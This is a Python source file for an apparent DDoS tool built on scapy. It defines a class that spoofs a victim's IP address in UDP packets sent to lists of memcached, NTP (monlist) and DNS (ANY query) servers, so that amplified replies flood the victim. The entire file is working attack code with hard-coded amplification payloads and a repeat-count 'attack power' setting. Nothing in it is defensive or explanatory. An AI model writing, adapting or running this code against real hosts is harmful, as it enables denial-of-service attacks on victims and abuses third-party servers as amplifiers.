import threading
from scapy.all import Raw, send, sr1
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR
from core.lib import data


class TouDoumAttack:
    server_list: data.Data = None
    use_memcached: bool = None
    use_ntp: bool = None
    use_dns: bool = None
    attack_power: int = None
    target_ip: str = None
    target_port: int = None
    verbose: bool = None

    attack_threads = []
    scapy_threads = []

    def __init__(self, amp, memcached, ntp, dns, power, target_ip, target_port, verbose):
        self.server_list = data.load(amp)
        self.use_memcached = memcached
        self.use_ntp = ntp
        self.use_dns = dns
        self.attack_power = power
        self.target_ip = target_ip
        self.target_port = target_port
        self.verbose = verbose

    def run(self):
        # todo print config
        # todo add a warning
        # create threads by type of attack
        if self.use_memcached:
            thread_memcached = threading.Thread(target=self.attack_memcached)
            thread_memcached.start()
            self.attack_threads.append(thread_memcached)
        if self.use_ntp:
            thread_ntp = threading.Thread(target=self.attack_ntp)
            thread_ntp.start()
            self.attack_threads.append(thread_ntp)
        if self.use_dns:
            thread_dns = threading.Thread(target=self.attack_dns)
            thread_dns.start()
            self.attack_threads.append(thread_dns)

        print("Waiting threads Finish...")
        for ath in self.attack_threads:
            ath.join()

        for sth in self.scapy_threads:
            sth.join()

        print("End of attack !")

    def attack_memcached(self):
        for ip in self.server_list.memcached:
            payload = "\x00\x00\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a"
            packet = IP(src=self.target_ip, dst=ip) / UDP(sport=self.target_port, dport=11211) / Raw(load=payload)
            t = threading.Thread(target=self.boom, args=packet)
            print("sending spoofed udp memcached packet to : " + ip)
            t.start()
            self.scapy_threads.append(t)

    def attack_ntp(self):
        payload = "\x17\x00\x03\x2a" + "\x00" * 44
        for ip in self.server_list.ntp:
            packet = IP(src=self.target_ip, dst=ip) / UDP(sport=self.target_port, dport=123) / Raw(load=payload)
            t = threading.Thread(target=self.boom, args=packet)
            print("sending spoofed udp ntp packet to : " + ip)
            t.start()
            self.scapy_threads.append(t)

    def attack_dns(self):
        for ip in self.server_list.dns:
            packet = IP(src=self.target_ip, dst=ip) / UDP(sport=self.target_port, dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ANY"))
            t = threading.Thread(target=self.boom, args=packet)
            print("sending spoofed udp dns packet to : " + ip)
            t.start()
            self.scapy_threads.append(t)

    def boom(self, packet):
        send(packet, count=self.attack_power, verbose=self.verbose)
